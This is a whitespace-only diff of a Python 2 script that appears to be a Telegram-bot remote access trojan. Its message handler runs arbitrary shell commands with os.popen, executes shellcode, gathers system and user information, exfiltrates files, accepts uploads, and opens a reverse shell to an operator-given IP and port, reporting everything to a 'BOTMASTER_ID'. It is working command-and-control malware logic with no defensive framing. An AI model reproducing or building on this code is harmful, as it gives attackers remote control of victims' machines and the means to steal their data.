@@ -39,13 +39,13 @@ def handle_message(msg):
     # this conditional is used to parse commands and execute them accordingly
     if content_type == 'text':
         received_command = msg['text']
-        
+
         type_command, argument_command = parse_command(received_command)
 
         if type_command == "command":
             proc = os.popen(argument_command)
             send_message(proc.read())
-            
+
         elif type_command == "shellcode":
             response_shellcode = execute_shellcode(argument_command)
             send_message(response_shellcode)
@@ -53,17 +53,17 @@ def handle_message(msg):
         elif type_command == "sysinfo":
             sysinfo = get_system_info()
             send_message(sysinfo)
-                
+
         elif type_command == "whoami":
             current_user = whoami()
             send_message(current_user)
-                
+
         elif type_command == "upload":
             send_message(uploadfunctionality_message)
-                
+
         elif type_command == "download":
             send_file(chat_id, argument_command)
-            
+
         elif type_command == "reverseshell":
             ip, port = argument_command.split()
             reverse_shell(ip, port)
@@ -75,21 +75,21 @@ def handle_message(msg):
 
         elif type_command == "help":
             send_message(help_message)
-        
+
         elif type_command == "unknown":
             unknown_command = "[!] ERROR: Unknown command: %s" % argument_command
             send_message(unknown_command)
-        
+
         else:
             print "[!] The program should never ever reach this point."
             return
-    
+
     # this conditional is used to receive files from the client
     elif content_type == 'document':
         file_id = msg['document']['file_id']
         filename = msg['document']['file_name']
         final_filename = filename
-        
+
         if not os.path.exists('./uploads'):
             try:
                 os.makedirs('./uploads')
@@ -97,7 +97,7 @@ def handle_message(msg):
             except OSError as err:
                 err_msg = "[!] ERROR: Could not create directory ./uploads. Saving in the current directory."
                 send_message(err_msg)
-        
+
         bot.downloadFile(file_id, final_filename)
 
 
@@ -106,7 +106,7 @@ def send_message(msg):
         bot.sendMessage(BOTMASTER_ID, msg)
     except Exception as err:
         print "[!] Error sending message: %s" % str(err)
-        
+
     return
 
 
@@ -133,10 +133,10 @@ def main():
         '''
         #bot.notifyOnMessage(handle_message)
         bot.message_loop(handle_message)
-        print bot.getMe()        
+        print bot.getMe()
     except Exception as err:
         print err
-    
+
     while True:
         time.sleep(10)
 
